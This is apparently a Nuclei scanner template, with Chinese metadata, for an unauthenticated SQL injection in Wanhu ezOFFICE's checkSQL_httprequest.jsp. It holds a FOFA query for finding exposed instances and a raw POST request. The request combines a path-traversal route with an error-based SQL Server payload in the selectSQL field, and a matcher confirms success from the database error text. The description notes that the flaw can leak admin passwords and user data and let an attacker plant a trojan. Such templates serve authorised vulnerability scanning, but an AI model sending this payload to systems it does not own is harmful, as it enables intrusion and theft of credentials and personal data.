id: WanHu-ezOFFICE-checkSQL_httprequest-SQL

info:
  name: 万户 ezOFFICE checkSQL_httprequest.jsp SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="万户网络-ezOFFICE"
    万户ezOFFICE checkSQL_httprequest.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: SQL Injection
  
http:
  - raw:
      - |-
        POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../modules/hrm/report/customize/checkSQL_httprequest.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
        Content-Type: application/x-www-form-urlencoded

        selectSQL=select distinct convert(int,@@VERSION)&dbType=sqlserver&fromSQL=--from+sysobjects+&whereSQL=--

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - 'status_code==200 && contains_all(body,"nvarchar","转换成数据类型 int 时失败。")'